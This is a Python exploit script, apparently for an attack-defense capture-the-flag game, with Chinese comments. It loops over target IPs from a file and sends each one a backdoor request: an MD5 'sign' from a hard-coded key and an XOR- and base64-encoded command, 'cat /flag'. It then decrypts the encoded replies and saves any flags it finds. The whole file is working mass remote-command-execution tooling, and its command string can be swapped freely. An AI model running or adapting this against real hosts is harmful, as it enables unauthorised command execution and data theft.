import base64
import hashlib
import urllib.parse
import requests
import re

SYSTEM="cat /flag"       #执行命令

def md5_hash(text):
    md5_obj = hashlib.md5()
    md5_obj.update(text.encode('utf-8'))
    return md5_obj.hexdigest()

key = "ise_666_hhhh"
sign = md5_hash(key)
def url_decode(encoded_url):
    return urllib.parse.unquote(encoded_url)
def xor_flag(flag, key):
    key_len = len(key)
    result = []
    for i in range(len(flag)):
        xor_char = chr(ord(flag[i]) ^ ord(key[i % key_len]))
        result.append(xor_char)
    return ''.join(result)


# 加密部分
def getshell(flag):
    flag = flag
    encrypted = xor_flag(flag, sign)
    b64_encoded = base64.b64encode(encrypted.encode()).decode()
    exp = "?sign=" + sign + "&check=" + b64_encoded
    print("利用exp：" + "?sign=" + sign + "&check=" + b64_encoded)
    return exp

def find_specific_pattern(text):
    pattern = r"(?<=ffllaagg).*?BsjJSBiO:kcehc_revres:kcehc_revres"

    matches = re.findall(pattern, text)
    if matches:
        for match in matches:
            print(f"{match}")
            return match
    else:
        print("No matches found.")


def decode(key):
    key = key  # 自己更改
    key1 = key.replace(":kcehc_revres", "=")
    key2 = key1.replace("BsjJSBiO==", "")
    decoded = base64.b64decode(key2.encode()).decode()
    decrypted = xor_flag(decoded, sign)
    url_de = url_decode(decrypted)
    print("[*]解密后的结果:", url_de)
    if 'flag' in SYSTEM:
        if 'flag' in url_de.lower():
            print(f"[√] 找到 flag：{url_de}")
            with open('flag.txt', 'a', encoding='utf-8') as f:
                f.write(f"{url_de}\n")
        else:
            print("[-] 解密后没有找到 flag。")

with open('ip.txt', 'r', encoding='utf-8') as f:
    for ip in f:
        url = f"http://{ip}"              #这里可以更改最后的
        exp = getshell(SYSTEM)
        url1 = url+exp
        req = requests.get(url=url1)
        res = req.text
        print(res)
        shell = find_specific_pattern(res)
        print('[*]加密字符为',shell)
        print('\n')
        decode(shell)


